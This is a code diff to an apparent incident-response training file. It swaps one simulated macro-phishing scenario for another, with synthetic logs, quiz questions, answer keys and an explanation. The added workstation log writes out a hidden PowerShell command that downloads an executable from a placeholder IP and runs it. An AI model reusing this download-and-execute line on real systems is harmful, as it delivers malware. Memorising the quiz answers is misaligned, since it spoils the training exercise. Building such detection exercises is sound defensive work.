@@ -4,76 +4,94 @@ scenarios.push({
     description: "Malicious process execution detected on a finance workstation following the opening of a macro-enabled document from an external source.",
     logs: {
         proxy: [
-            "2026-05-29T08:45:12Z - IP: 192.168.10.14 - URL: https://github.com/company-org - Action: Allowed - Bytes: 15320",
-            "2026-05-29T09:12:45Z - IP: 192.168.10.12 - URL: https://update-services.example.top/api/v2/config - Action: Allowed - Status: 200 - Bytes: 1024",
-            "2026-05-29T09:13:45Z - IP: 192.168.10.12 - URL: https://update-services.example.top/api/v2/config - Action: Allowed - Status: 200 - Bytes: 1024",
-            "2026-05-29T09:14:45Z - IP: 192.168.10.12 - URL: https://update-services.example.top/api/v2/config - Action: Allowed - Status: 200 - Bytes: 1024",
-            "2026-05-29T09:15:30Z - IP: 192.168.10.45 - URL: https://outlook.office.com/mapi - Action: Allowed - Bytes: 9200",
-            "2026-05-29T09:20:05Z - IP: 192.168.10.15 - URL: https://www.google.com/search?q=weather - Action: Allowed - Bytes: 1200",
-            "2026-05-29T09:45:12Z - IP: 192.168.10.33 - URL: https://teams.microsoft.com - Action: Allowed - Bytes: 13400"
+            "2026-06-02T08:15:20Z - IP: 192.168.10.33 - URL: https://bamboohr.com/dashboard - Action: Allowed - Category: HR/Business - Status: 200 - Bytes: 12500",
+            "2026-06-02T08:22:45Z - IP: 192.168.10.14 - URL: https://github.com/company-org/backend - Action: Allowed - Category: IT/Development - Status: 200 - Bytes: 45200",
+            "2026-06-02T08:35:10Z - IP: 192.168.10.10 - URL: https://canva.com/design - Action: Allowed - Category: Media/Arts - Status: 200 - Bytes: 850000",
+            "2026-06-02T09:20:20Z - IP: 192.168.10.12 - URL: http://198.51.100.44/payloads/sys_update.exe - Action: Allowed - Category: Uncategorized - Status: 200 - Bytes: 1450000",
+            "2026-06-02T09:21:00Z - IP: 192.168.10.12 - URL: https://198.51.100.44/api/v1/connect - Action: Allowed - Category: Uncategorized - Status: 200 - Bytes: 512",
+            "2026-06-02T09:22:00Z - IP: 192.168.10.12 - URL: https://198.51.100.44/api/v1/connect - Action: Allowed - Category: Uncategorized - Status: 200 - Bytes: 512",
+            "2026-06-02T09:23:00Z - IP: 192.168.10.12 - URL: https://198.51.100.44/api/v1/connect - Action: Allowed - Category: Uncategorized - Status: 200 - Bytes: 512",
+            "2026-06-02T09:30:15Z - IP: 192.168.10.10 - URL: https://slack.com/api/rtm.start - Action: Allowed - Category: Business/Collaboration - Status: 200 - Bytes: 3100"
         ],
         email: [
-            "2026-05-29T08:50:00Z - Inbound - From: notifications@slack.com - To: fsmith@example.com - Subject: You have unread messages - Status: Delivered",
-            "2026-05-29T09:00:10Z - Inbound - From: billing@vendor-corp.example.net - To: fsmith@example.com - Subject: URGENT: Outstanding Invoice Q2 - Attachment: Invoice_Q2_Final.docm - Status: Delivered",
-            "2026-05-29T09:05:00Z - Inbound - From: hr@example.com - To: fsmith@example.com - Subject: Performance Review Guidelines - Attachment: Review_2026.pdf - Status: Delivered",
-            "2026-05-29T09:30:00Z - Outbound - From: asmith@example.com - To: client@external.com - Subject: RE: Project Assets - Status: Sent"
+            "2026-06-02T08:00:10Z - Inbound - From: notifications@slack.com - To: asmith@company.com - Subject: Daily Team Sync - Status: Delivered",
+            "2026-06-02T08:12:15Z - Inbound - From: alerts@bamboohr.com - To: mrogers@company.com - Subject: New Time Off Request - Status: Delivered",
+            "2026-06-02T09:15:00Z - Inbound - From: billing@vendor-invoicing-portal.com - To: fsmith@company.com - Subject: URGENT: Action Required - Overdue_Invoice_Q2 - Attachment: Overdue_Invoice_Q2.xlsm - Status: Delivered",
+            "2026-06-02T09:40:00Z - Inbound - From: newsletter@techtrends.com - To: rjones@company.com - Subject: Weekly Technology Brief - Status: Delivered"
         ],
         file_server: [
-            "2026-05-29T08:30:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
-            "2026-05-29T09:05:00Z - Share Name: \\\\FILE-SRV-01\\Finance - Access Request: Allowed - User: COMPANY\\fsmith",
-            "2026-05-29T09:15:45Z - Object Accessed: \\\\FILE-SRV-01\\Finance\\2026_Q2_Forecast.xlsx - Accesses: ReadData - User: COMPANY\\fsmith",
-            "2026-05-29T09:40:12Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.33 - User: COMPANY\\mrogers"
+            "2026-06-02T08:20:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
+            "2026-06-02T08:21:05Z - Object Accessed: \\\\FILE-SRV-01\\Public\\Templates\\Brand_Kit.zip - Accesses: ReadData - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
+            "2026-06-02T08:48:00Z - Share Name: \\\\FILE-SRV-01\\HR - Access Request: Allowed - Source IP: 192.168.10.33 - User: COMPANY\\mrogers",
+            "2026-06-02T08:49:15Z - Object Accessed: \\\\FILE-SRV-01\\HR\\Onboarding\\Benefits_Guide.pdf - Accesses: ReadData - Source IP: 192.168.10.33 - User: COMPANY\\mrogers"
         ],
         workstations: [
-            "2026-05-29T09:01:22Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: explorer.exe spawned slack.exe",
-            "2026-05-29T09:10:05Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: winword.exe spawned - Command: \"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\fsmith\\Downloads\\Invoice_Q2_Final.docm\"",
-            "2026-05-29T09:10:30Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: winword.exe spawned cmd.exe - Command: cmd.exe /c \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...\"",
-            "2026-05-29T09:11:00Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: powershell.exe spawned whoami /all",
-            "2026-05-29T09:20:15Z - WKSTN-01 (192.168.10.10) - EventID: 4688 - Process Created: outlook.exe spawned chrome.exe --url https://teams.microsoft.com",
-            "2026-05-29T09:45:10Z - WKSTN-01 (192.168.10.10) - EventID: 4800 - Workstation Locked - User: COMPANY\\asmith"
+            "2026-06-02T08:01:22Z - WKSTN-01 (192.168.10.10) - EventID: 4688 - Process Created: explorer.exe spawned slack.exe --startup",
+            "2026-06-02T08:22:00Z - WKSTN-03 (192.168.10.14) - EventID: 4688 - Process Created: explorer.exe spawned cmd.exe /c ping 8.8.8.8",
+            "2026-06-02T09:18:30Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: explorer.exe spawned outlook.exe",
+            "2026-06-02T09:20:10Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: outlook.exe spawned excel.exe \"C:\\Users\\fsmith\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Overdue_Invoice_Q2.xlsm\"",
+            "2026-06-02T09:20:15Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: excel.exe spawned powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'http://198.51.100.44/payloads/sys_update.exe' -OutFile '$env:APPDATA\\sys_update.exe'; Start-Process '$env:APPDATA\\sys_update.exe'\"",
+            "2026-06-02T09:20:30Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: powershell.exe spawned C:\\Users\\fsmith\\AppData\\Roaming\\sys_update.exe",
+            "2026-06-02T09:20:35Z - WKSTN-02 (192.168.10.12) - EventID: 7045 - Service Created: SysUpdateSvc - Service File Name: C:\\Users\\fsmith\\AppData\\Roaming\\sys_update.exe - User Context: LocalSystem",
+            "2026-06-02T09:45:00Z - WKSTN-33 (192.168.10.33) - EventID: 4800 - Workstation Locked - User: COMPANY\\mrogers"
         ],
         auth_logs: [
-            "2026-05-29T08:00:15Z - WKSTN-01 (192.168.10.10) - EventID: 4624 - Successful Logon - User: COMPANY\\asmith",
-            "2026-05-29T08:30:00Z - WKSTN-02 (192.168.10.12) - EventID: 4624 - Successful Logon - User: COMPANY\\fsmith",
-            "2026-05-29T08:45:10Z - WKSTN-03 (192.168.10.14) - EventID: 4624 - Successful Logon - User: COMPANY\\rjones",
-            "2026-05-29T09:10:30Z - WKSTN-02 (192.168.10.12) - EventID: 4672 - Special Privileges Assigned to New Logon - User: fsmith - Note: Elevated via Macro Execution"
+            "2026-06-02T08:00:15Z - WKSTN-01 (192.168.10.10) - EventID: 4624 - Successful Logon - User: COMPANY\\asmith - Logon Type: 2 (Interactive)",
+            "2026-06-02T08:10:00Z - WKSTN-33 (192.168.10.33) - EventID: 4624 - Successful Logon - User: COMPANY\\mrogers - Logon Type: 2 (Interactive)",
+            "2026-06-02T08:15:00Z - WKSTN-03 (192.168.10.14) - EventID: 4624 - Successful Logon - User: COMPANY\\rjones - Logon Type: 2 (Interactive)",
+            "2026-06-02T08:45:10Z - WKSTN-02 (192.168.10.12) - EventID: 4624 - Successful Logon - User: COMPANY\\fsmith - Logon Type: 2 (Interactive)"
         ]
     },
     questions: {
         vector: {
-            label: "What was the initial infection vector for this incident?",
+            label: "What was the initial delivery vector used to compromise the workstation?",
             type: "select",
             options: [
-                "Drive-by Download",
-                "Phishing via Macro-Enabled Attachment",
-                "Exploitation of a Public-Facing API",
-                "Unauthorized RDP Access"
+                "An unauthenticated VPN connection bypass exploiting stale user accounts",
+                "A spear-phishing email containing a macro-enabled Excel attachment",
+                "A malicious drive-by download via a compromised web advertisement",
+                "A supply chain compromise in a third-party software library"
             ],
-            correct: "Phishing via Macro-Enabled Attachment"
+            correct: "A spear-phishing email containing a macro-enabled Excel attachment"
+        },
+        origin: {
+            label: "Identify the internal host utilized by the victim during the initial execution phase (Patient Zero):",
+            type: "select",
+            options: [
+                "WKSTN-01",
+                "WKSTN-02",
+                "WKSTN-03",
+                "WKSTN-33"
+            ],
+            correct: "WKSTN-02"
         },
         indicator: {
-            label: "Which process relationship on WKSTN-02 is the definitive indicator of malicious activity?",
+            label: "Which specific parent-child process relationship confirms the execution of the malicious VBA macro?",
             type: "select",
             options: [
-                "explorer.exe spawning winword.exe",
-                "winword.exe spawning cmd.exe to execute PowerShell",
-                "powershell.exe performing a DNS query",
-                "chrome.exe accessing the Finance file share"
+                "explorer.exe spawning cmd.exe to run a ping sweep",
+                "outlook.exe spawning excel.exe to view the attachment",
+                "excel.exe spawning powershell.exe with hidden window styles",
+                "powershell.exe spawning sys_update.exe from the AppData folder"
             ],
-            correct: "winword.exe spawning cmd.exe to execute PowerShell"
+            correct: "excel.exe spawning powershell.exe with hidden window styles"
         },
-        mitigation: {
-            label: "Which security control would most effectively prevent this specific attack vector?",
+        persistence: {
+            label: "How did the secondary payload ensure persistence on the compromised machine?",
             type: "select",
             options: [
-                "Implementing Multi-Factor Authentication (MFA)",
-                "Disabling Office Macros via Group Policy (GPO) for external documents",
-                "Enforcing complex password rotation policies",
-                "Deploying a more restrictive Web Application Firewall (WAF)"
+                "By creating a new rogue administrative user account",
+                "By dropping an unauthorized IIS Web Shell in the server's public root",
+                "By adding a persistent registry Run key inside the user profile",
+                "By registering the dropped executable as a new Windows service (SysUpdateSvc)"
             ],
-            correct: "Disabling Office Macros via Group Policy (GPO) for external documents"
+            correct: "By registering the dropped executable as a new Windows service (SysUpdateSvc)"
         }
     },
-    principles: ["Phishing / Social Engineering", "Beaconing / Command & Control", "Obfuscation / Encryption"],
-    explanation: "User 'fsmith' received an external phishing email containing a macro-enabled Word document ('Invoice_Q2_Final.docm'). Upon opening the document, the document's embedded VBA macro executed at 09:10:30Z, confirmed by the anomalous parent-child process relationship of 'winword.exe' spawning 'cmd.exe' and an obfuscated PowerShell session. The attacker's payload then established a 60-second C2 beacon. Benign noise includes the user opening a legitimate PDF guidelines document and standard business traffic from other workstations."
+    principles: [
+        "Phishing / Social Engineering",
+        "Beaconing / Command & Control",
+        "Persistence"
+    ],
+    explanation: "At 09:15:00Z, finance user 'fsmith' received a spear-phishing email containing an attachment named 'Overdue_Invoice_Q2.xlsm'. At 09:20:10Z, the user opened the document on WKSTN-02. Upon enabling content, the malicious VBA macro embedded within the spreadsheet executed, generating an anomalous parent-child process relationship: excel.exe spawned powershell.exe with bypass policies and hidden window styles. This PowerShell script reached out to the external IP 198.51.100.44 to download a secondary executable ('sys_update.exe') into the local AppData directory. The payload then established persistence by creating a new system service (SysUpdateSvc, EventID 7045) and began emitting a rigid 60-second C2 heartbeat over HTTPS. Background noise included benign command-line network tests by IT personnel ('rjones') and standard file-sharing access by marketing and HR employees."
 });
